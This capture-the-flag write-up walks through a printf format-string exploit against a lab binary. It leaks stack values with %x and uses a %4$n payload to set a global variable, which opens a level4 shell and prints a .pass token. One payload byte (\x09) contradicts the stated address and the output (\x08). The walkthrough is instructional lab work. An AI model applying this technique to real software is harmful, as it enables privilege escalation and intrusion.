- ./level3 is a binary that asks us an input. And he just writes it back. Np segmentation fault that could lead to a buffer overflow here.

```C
void v(void)
{
    char local_20c [520];
    
    fgets(local_20c,0x200,stdin);
    printf(local_20c);
    if (m == 0x40) {
        fwrite("Wait what?!\n",1,0xc,stdout);
        system("/bin/sh");
    }
    return;
}

void main(void)
{
    v();
    return;
}
```

- The program execute /bin/sh if the m global variable is equal to 0x40 / 64 in decimal. We have to overwrite this variable in order to get a higher privilege shell. We will use the format string vulnerabiliy.

- Let's first leak the address of the m variable.

```bash
> nm ./level3 | grep m

         w __gmon_start__
         U __libc_start_main@@GLIBC_2.0
08049884 b completed.6159
08048480 t frame_dummy
0804988c B m
0804851a T main
         U system@@GLIBC_2.0
```

- The address of m is 0x0804988c

- Let's leak stack memory with printf vulnerability

```bash
> ./level3
AAAA %x %x %x %x %x %x %x %x 
AAAA 200 f7f57620 380 41414141 20782520 25207825 78252078 20782520 25207825
```


- We see here that the printf pointer in memory arrives on the local_20c buffer at index 4.


- Now let's see what does %n. %n does print anything but put the number of bytes printed by printf in the variable given in argument.

```C
printf("ABCDEF%n", &x);

- This put the value 6 in x.

printf("ABCDEF%4$n");

- This put the value 6 in the 4th element pointed by printf
```

- Exploit:

```
payload: "\x8c\x98\x04\x09" + 60*"A" + "%4$n"

First element is the address of m that we put in the buffer
Then we add a padding to reach exactly 64, the number we want to put in m
Then we tell printf to put the 64 bytes read into the 4th element of the stack that we treat as a pointer, this our local buffer, that contains the address of m. So printf will put 64 bytes at the addres of m.
```


```bash
python3 exploit.py

\x8c\x98\x04\x08BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Wait what?!
$ $ whoami
level4

$ $ cat .pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
